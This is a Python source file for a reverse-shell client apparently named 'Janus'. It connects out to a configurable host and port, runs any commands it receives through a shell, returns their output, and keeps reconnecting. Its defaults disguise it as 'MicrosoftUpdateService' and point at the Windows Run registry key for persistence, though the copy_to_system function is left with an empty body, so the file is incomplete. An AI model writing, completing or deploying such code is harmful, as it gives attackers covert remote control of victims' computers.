import os
import sys
import socket
import subprocess
from time import sleep

# Resolve path regardless of if running directly or as PyInstaller executable
if getattr(sys, 'frozen', False):
    application_path = os.path.dirname(sys.executable)
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

env_path = os.path.join(application_path, '.env')
if os.path.exists(env_path):
    with open(env_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                if '=' in line:
                    key, value = line.split('=', 1)
                    os.environ[key.strip()] = value.strip()

IP = os.environ.get("JANUS_IP", "127.0.0.1")
PORT = int(os.environ.get("JANUS_PORT", 443))
PROGRAM_NAME = os.environ.get("PROGRAM_NAME", "MicrosoftUpdateService")
REGISTRY_KEY_PATH = os.environ.get("REGISTRY_KEY_PATH", "Software\Microsoft\Windows\CurrentVersion\Run")


def copy_to_system():
    

def connect():
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((IP, PORT))

        return c
    except Exception as e:
        print(f'Connection error: {e}')


def listen(c):  
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                cmd(c, data)

    except Exception as e:
        print(f'Listen function error: {e}')


def cmd(c, data):
    try:

        if data.startswith("cd "):
            try:
                os.chdir(data[3:].strip())
            except Exception as e:
                print(f'CD function error: {e}')            
            
            return

        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )

        output = p.stdout.read() + p.stderr.read() + b"\n"
        c.send(output)

    except Exception as e: 
        print(f'CMD function error: {e}')


if __name__ == '__main__':
    try:
        while True:
            client = connect()

            if client:
                listen(client)
            else :
                sleep(5)

    except KeyboardInterrupt:
        print('Program stopped by the user')

    except Exception as e:
        print(f'Error in main function: {e}')
